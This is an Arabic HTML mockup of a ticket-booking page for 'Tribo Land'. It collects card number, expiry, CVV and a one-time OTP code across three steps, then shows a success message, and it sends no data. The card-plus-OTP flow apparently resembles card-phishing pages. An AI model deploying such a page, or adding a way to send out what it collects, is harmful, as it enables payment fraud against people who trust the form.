<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حجز تذاكر تريبو لاند</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background-image: url('https://tse2.mm.bing.net/th?id=OIP.cmX4CV9_6krEbKTxWpK8LAHaFk&pid=Api');
            background-size: cover; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card {
            background: rgba(255, 255, 255, 0.9); 
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
            opacity: 0;
            transform: scale(0.9);
            transition: opacity 0.6s, transform 0.6s;
        }
        .card.show {
            opacity: 1;
            transform: scale(1);
        }
        input, button {
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #ccc;
            width: 100%;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover { background-color: #0056b3; }
        h2 { margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="card" id="card">
        <div id="step1">
            <h2>احجز تذكرتك لـ تريبو لاند</h2>
            <input type="text" id="name" placeholder="الاسم">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="number" id="tickets" placeholder="عدد التذاكر" value="1" min="1">
            <input type="date" id="bookingDate" placeholder="تاريخ الحجز">
            <button onclick="nextStep(2)">التالي</button>
        </div>

        <div id="step2" style="display:none;">
            <h2>بيانات الدفع</h2>
            <input type="text" id="cardNumber" placeholder="رقم البطاقة">
            <input type="date" id="expiryDate" placeholder="تاريخ الانتهاء">
            <input type="text" id="cvv" placeholder="CVV">
            <button onclick="nextStep(3)">التالي</button>
        </div>

        <div id="step3" style="display:none;">
            <h2>أدخل كود الـ OTP</h2>
            <input type="text" id="otp" placeholder="OTP">
            <button onclick="nextStep(4)">تأكيد</button>
        </div>

        <div id="step4" style="display:none;">
            <h2>تم الحجز بنجاح!</h2>
            <button onclick="location.reload()">إعادة الحجز</button>
        </div>
    </div>

    <script>
        const card = document.getElementById('card');
        window.onload = () => {
            setTimeout(() => { card.classList.add('show'); }, 300);
        }

        function nextStep(step) {
            document.getElementById('step1').style.display = step === 1 ? 'block' : 'none';
            document.getElementById('step2').style.display = step === 2 ? 'block' : 'none';
            document.getElementById('step3').style.display = step === 3 ? 'block' : 'none';
            document.getElementById('step4').style.display = step === 4 ? 'block' : 'none';
        }
    </script>
</body>
</html>
